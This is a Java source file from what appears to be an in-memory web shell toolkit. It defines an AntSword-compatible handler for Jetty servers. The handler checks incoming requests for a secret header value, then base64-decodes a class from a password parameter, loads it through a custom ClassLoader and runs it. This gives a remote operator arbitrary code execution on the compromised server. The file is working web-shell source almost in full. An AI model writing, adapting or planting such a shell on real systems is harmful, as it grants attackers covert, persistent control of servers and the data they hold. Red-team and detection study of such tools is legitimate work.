package com.reajason.javaweb.memshell.shelltool.antsword;

/**
 * @author ReaJason
 */
public class AntSwordJettyHandler extends ClassLoader {

    public static String pass;
    public static String headerName;
    public static String headerValue;

    @SuppressWarnings("all")
    public Class<?> g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    public AntSwordJettyHandler() {
    }

    public AntSwordJettyHandler(ClassLoader c) {
        super(c);
    }

    @Override
    public boolean equals(Object obj) {
        Object[] args = ((Object[]) obj);
        Object baseRequest = null;
        Object request = null;
        Object response = null;
        if (args.length == 4) {
            Object arg4 = args[3];
            baseRequest = args[1];
            if (arg4 instanceof Integer) {
                // jetty6
                request = args[1];
                response = args[2];
            } else {
                request = args[2];
                response = args[3];
            }
        } else {
            // ee10
            request = args[0];
            response = args[1];
        }
        try {
            String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
            if (value != null && value.contains(headerValue)) {
                if (baseRequest != null) {
                    baseRequest.getClass().getMethod("setHandled", boolean.class).invoke(baseRequest, true);
                }
                String parameter = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, pass);
                byte[] bytes = base64Decode(parameter);
                Object instance = (new AntSwordJettyHandler(Thread.currentThread().getContextClassLoader())).g(bytes).newInstance();
                instance.equals(new Object[]{request, response});
                return true;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return false;
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) {
        byte[] value = null;
        Class<?> base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
            } catch (Exception ignored) {
            }
        }
        return value;
    }
}